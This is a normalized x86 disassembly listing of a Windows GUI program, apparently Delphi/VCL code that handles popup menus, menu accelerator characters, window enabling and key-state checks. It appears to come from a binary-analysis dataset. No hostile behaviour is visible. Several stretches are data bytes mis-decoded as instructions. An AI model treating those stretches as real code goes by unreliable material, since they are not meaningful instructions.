mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188a0
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_45c208
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188a0
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188a0
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_45c238
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188a0
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4188a0
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_45c238
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_468ffc
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_469064
jmp r-xdata
sub_45d3a3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_45d45c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_418744
pop esi
pop ebx
retn
push ebx
push sub_45cecc
call sub_4222d0
mov [ ebx + 0x10 ] eax
sub_45d4a0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45c020
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_45d45c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_45d514
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45d484
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45c0bc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_45d56c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_4583b8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_45cd28
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_45cd28
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_45d5b4
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_4583b8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_467ba8
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403564
mov edx eax
jmp r-xdata
sub_45d600
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_41723c
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_45d56c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_45b974
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_45be70
mov eax [ ebx + 0x34 ]
call sub_459218
mov eax ebx
call sub_45c818
mov eax ebx
call sub_45d5b4
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_459348
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45d6b4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4188a0
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4188a0
cmp ebp [ eax ]
jne r-xdata
sub_45d6f0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_4249a4
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_4241d8
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_4249a4
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_4241d8
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403564
mov edx [ r-xdata ]
call sub_4034f4
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_4249a4
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_4241d8
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_45d7d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_4041b8
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_404424
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_4046c4
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_404424
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_4046c4
jmp r-xdata
sub_45d86c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_404164
mov ebx 0x1
mov eax esi
call sub_404424
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_40434c
sub_45d8d0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45d929
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45d7d8
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45d7d8
mov eax [ ebp - 0x8 ]
pop edx
call sub_408218
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d930
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
sub_45d938
adc al [ eax ]
add [ eax ] al
mov [ 0x36940048 ] ch
dec eax
add [ ebp + ebp + 0x36280048 ] al
dec eax
add [ eax - 0x4bffb7d3 ] al
xor eax 0x2d7c0048
dec eax
add [ eax ] al
dec eax
add [ eax + 0x2d ] bh
dec eax
add [ eax ] bh
cmp cl [ eax ]
je r-xdata
add [ ebp + ebp + 0x48 ] bl
add [ eax + 0x5800483a ] dl
sub eax 0x3a400048
dec eax
add [ ebp + ebp + 0x48 ] dl
add [ ebx + edi + 0x48 ] ah
add [ eax + 0x2d ] dl
dec eax
add [ ebx + edi ] bl
dec eax
add [ ebp + ebp + 0x48 ] cl
add [ edi + esi ] cl
dec eax
add [ eax + 0x2d ] cl
dec eax
add [ eax ] ah
aaa
dec eax
add [ ebp + ebp + 0x48 ] al
add [ eax + 0x55004837 ] cl
mov ebp esp
xor eax eax
push ebp
push sub_45da30
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
dec eax
add [ eax ] cl
dec eax
add [ eax + 0x2d ] dh
dec eax
add [ eax ] ch
cmp [ eax ] cl
insb
sub eax 0x37600048
dec eax
add [ eax + 0x2d ] ch
dec eax
add al bh
cmp cl [ eax ]
sub eax 0x3af40048
dec eax
add [ eax + 0x2d ] ah
dec eax
add al bh
dec eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45da37
retn
mov eax [ rw-data ]
call sub_403368
mov eax [ rw-data ]
call sub_403368
mov eax [ rw-data ]
call sub_403368
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404c00
mov eax rw-data
call sub_404164
sub_45da3c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_45d938
call sub_403e8c
mov eax [ r-xdata ]
call sub_417ed4
mov eax [ r-xdata ]
call sub_417f74
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f20
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f20
mov eax [ r-xdata ]
call sub_417e18
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429da0
mov [ rw-data ] eax
sub_45dc8b
mov eax 0x1004605
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
call [ esi + eax + 0x10046 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
fadd [ esi ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
push eax
push es
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
popad
outsb
add [ gs : bx + si ] dl
outsd
insb
outsd
jb r-xdata
add [ ebp + esi + 0x12480040 ] ah
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add ah ah
or [ esi ] eax
int3
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x80045dd ] bh
ja r-xdata
inc ebp
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
add eax 0x676e6152
add [ gs : eax ] dl
adc [ eax ] al
or al 0x0
add bh bh
rol [ 0x10046 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0x6f500800
jae r-xdata
add al [ ebp ]
hlt
dec esi
outsd
jb r-xdata
add [ eax ] al
je r-xdata
add ah cl
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
outsd
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
jmp [ eax ]
pop esp
test [ eax + eax - 0x58 ] al
mov bh 0x44
add [ ebp + ecx * 4 + 0x190c0044 ] bl
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
cmp al 0xc9
inc esp
add [ eax ] dh
or al [ esi ]
in al dx
int3
inc esi
add [ esp + ecx * 8 + 0x44 ] dl
add [ eax ] ah
or al [ esi ]
inc edx
add ah dh
adc eax 0x15ec0042
inc edx
add [ ecx + ebx ] dl
inc edx
add [ ecx + ecx + 0x46 ] ch
add al ah
std
inc esp
add ah bh
add al [ ebp ]
dec eax
add al [ ebp ]
rol [ edx - 0x7a3ffbc ] 0x1
inc esp
add [ eax + edi * 8 + 0x44 ] bh
add [ ebp + esi * 8 - 0x7de7ffbc ] dl
inc esp
add [ edx + eax * 4 ] bl
inc esp
add [ eax - 0x4e ] bl
inc esp
add [ edx + esi * 4 - 0x727bffbc ] al
inc esp
add [ ebx + eax * 4 - 0x70efffbc ] dl
inc esp
add [ eax - 0x63ffbb72 ] cl
xchg ecx eax
inc esp
add [ eax - 0x70 ] cl
inc esp
add al cl
rol [ eax + eax + 0x8 ] 0x1
mov bl 0x44
add al ch
cmc
inc esp
add [ esi + esi * 8 - 0xe5fffbc ] ah
inc esp
add [ eax - 0x63ffbb0a ] cl
adc [ esi ] al
jo r-xdata
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
inc eax
pop es
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ ebp + ebx * 8 + 0xc030045 ] bh
push esp
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
ror [ esi + ebx * 8 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
fild [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and bh bl
inc ebp
add [ esi - 0x21 ] al
inc ebp
add [ edx + eax ] bl
add [ eax ] al
hlt
sub_45de29
push ecx
inc esp
add ah dh
sbb [ edx ] al
movsb [ edi ] [ esi ]
xor eax 0x12480040
inc edx
add [ ebp + esi - 0x2cd3ffc0 ] ch
inc esp
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add ah ah
or [ esi ] eax
int3
sub_45e400
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xe5
inc ebp
add al ah
out 0x45 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x1b ] bl
inc ebp
add dh cl
out 0x45 al
add al bh
add al [ eax ]
add [ eax ] al
fiadd [ ebp ]
hlt
sub_45e50a
inc esp
add [ edx * 2 + 0xa900046 ] cl
inc esi
add [ eax + 0xd ] al
inc esi
add ah ch
inc ebp
inc esi
add [ eax ] ch
push ss
inc esi
add [ esi + edx + 0x58ec0046 ] ah
inc esi
add [ eax + 0x13 ] ah
inc esi
add al dh
push ebx
inc esi
add al dl
cmp al [ esi ]
movsb [ edi ] [ esi ]
push ebp
inc esi
add [ eax + 0xe004620 ] cl
cmp al 0xb0
add [ eax - 0x4ff24ffb ] esi
adc [ eax - 0x4fea4ff2 ] dh
sbb [ eax - 0x4fde4fe3 ] esi
adc dh [ eax - 0x4fc24fd7 ]
or [ eax - 0x4c4fbc ] dh
mov dl 0xff
in eax dx
add [ eax + 0x2 ] dl
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
inc eax
loopne r-xdata
mov [ eax ] ah
inc esi
add [ esi ] cl
inc ebp
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
sub_45e75b
add [ eax + 0x17 ] al
inc esi
add [ eax + ebx + 0x46 ] cl
add [ ebp + ecx * 4 + 0x190c0044 ] bl
inc edx
add ah al
and [ esi ] al
in al dx
adc eax 0x5c640042
inc esi
add [ ecx + edx - 0x21fffba ] bl
inc esp
add ah bh
add al [ ebp ]
dec eax
add al [ ebp ]
rol [ edx - 0x7a3ffbc ] 0x1
inc esp
add [ ebp + ebx - 0xa6bffba ] ah
inc esp
add [ eax ] bl
add [ eax + eax + 0x1c ] 0x82
inc esp
add [ eax - 0x7bffb9e2 ] bl
mov dl 0x44
add [ ebp + ecx * 4 - 0x7c6bffbc ] al
inc esp
add [ eax ] dl
pop [ eax + eax - 0x74 ]
and [ esi ] al
pop eax
pop ds
inc esi
add [ eax - 0x70 ] cl
inc esp
add [ ecx ] al
inc esi
add [ eax ] cl
mov bl 0x44
add al ch
cmc
inc esp
add [ esi + esi * 8 - 0xe5fffbc ] ah
inc esp
add [ eax - 0x63ffbb0a ] cl
adc [ esi ] al
test al 0x27
inc esi
add [ esp + ecx * 8 + 0x44 ] dl
add [ esp + esi + 0x46 ] ch
add ah cl
aaa
inc esi
add [ eax - 0x13ffb9ca ] cl
int3
sub_45f4a4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0xf6
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
cmc
inc ebp
add [ eax ] bl
test [ ebp ] 0xf8
add al [ eax ]
add ah bh
jecxz r-xdata
in al dx
adc eax 0x5c640042
inc esi
add [ esi + ebx * 2 ] bh
inc esi
add al ah
std
inc esp
add ah bh
add al [ ebp ]
dec eax
add al [ ebp ]
rol [ edx - 0x7a3ffbc ] 0x1
inc esp
add [ ebp + ebx - 0xa6bffba ] ah
inc esp
add [ eax ] bl
add [ eax + eax + 0x1c ] 0x82
inc esp
add [ eax - 0x7bffb9e2 ] bl
mov dl 0x44
add [ ebp + ecx * 4 - 0x7c6bffbc ] al
inc esp
add [ eax ] dl
pop [ eax + eax - 0x74 ]
and [ esi ] al
pop eax
pop ds
inc esi
add [ eax - 0x70 ] cl
inc esp
add [ ecx ] al
inc esi
add [ eax ] cl
mov bl 0x44
add al ch
cmc
inc esp
add [ esi + esi * 8 - 0xe5fffbc ] ah
inc esp
add [ eax - 0x63ffbb0a ] cl
adc [ esi ] al
test al 0x27
inc esi
add [ esp + ecx * 8 + 0x44 ] dl
add [ esp + esi + 0x46 ] ch
add ah cl
aaa
inc esi
add [ eax - 0x13ffb9ca ] cl
int3
add ah dh
sbb [ edx ] al
sub [ ebx ] dl
inc esi
add ah bl
adc al 0x46
add [ ebp + esi + 0x39480040 ] ch
inc esi
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ ebp + edx + 0x46 ] al
add ah cl
add al [ ebp ]
mov ah 0x1a
inc esi
add [ esi + ecx * 4 + 0x5fa80041 ] dh
inc esi
add [ eax + 0x17 ] al
inc esi
add [ eax + ebx + 0x46 ] cl
add [ ebp + ecx * 4 + 0x190c0044 ] bl
inc edx
add ah al
and [ esi ] al
sub_45f8a0
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_45f8ec
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46906c
mov eax [ rw-data ]
call sub_421424
mov eax [ rw-data ]
call sub_4213cc
retn
push 0x0
push eax
call ShowOwnedPopups
sub_45f924
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026ec
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_45f974
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_45fa17
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_45f9e0
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_45f924
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45fa1e
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_45fa28
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_40270c
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_45fa60
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_45fac4
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_45fa60
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_45fb20
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_45fb40
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_45fb20
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_45fb6c
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_4665d4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_466a8c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_408130
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4665c0
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_466a78
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_408130
test eax eax
je r-xdata
sub_45fbf4
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_45fc48
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_45fc84
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_45fcd0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45fd2e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45d86c
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_40434c
mov eax [ ebp - 0x8 ]
pop edx
call sub_408130
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
